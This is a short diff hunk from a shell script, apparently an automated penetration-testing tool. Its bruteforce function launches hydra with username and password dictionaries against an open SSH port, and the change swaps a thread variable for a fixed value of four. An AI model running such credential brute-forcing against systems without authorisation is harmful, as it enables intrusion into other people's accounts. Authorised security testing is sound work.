@@ -40,7 +40,7 @@ bruteforce() {
         if grep -q 22/tcp Scans/${1}/${1}.txt; then
                 echo -e "[${yellow}**${default}] Port 22(SSH) is open. Starting bruteforce...\n"
 		sleep 1
-                hydra -L "dic/dic_username_ssh.txt" -P "dic/dic_password_ssh.txt" $1 ssh -e ns -o Output/${1}/ssh_${1}.txt -I -t $thread
+                hydra -L "dic/dic_username_ssh.txt" -P "dic/dic_password_ssh.txt" $1 ssh -e ns -o Output/${1}/ssh_${1}.txt -I -t 4
                 finished_brute $1
         fi
 
